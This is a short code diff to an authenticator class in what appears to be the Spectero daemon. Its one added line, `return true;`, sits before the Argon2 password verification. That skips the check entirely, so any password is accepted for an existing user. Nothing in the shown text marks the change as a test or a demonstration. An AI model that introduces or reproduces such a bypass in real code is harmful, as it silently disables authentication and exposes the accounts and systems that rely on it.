@@ -46,6 +46,7 @@ namespace Spectero.daemon.Libraries.Core.Authenticator
 
             if (user != null)
             {
+                return true;
                 var ret = Argon2.Verify(user.Password, password);
                 _logger.LogDebug("UPA: Argon2 said " + ret);
                 return ret;
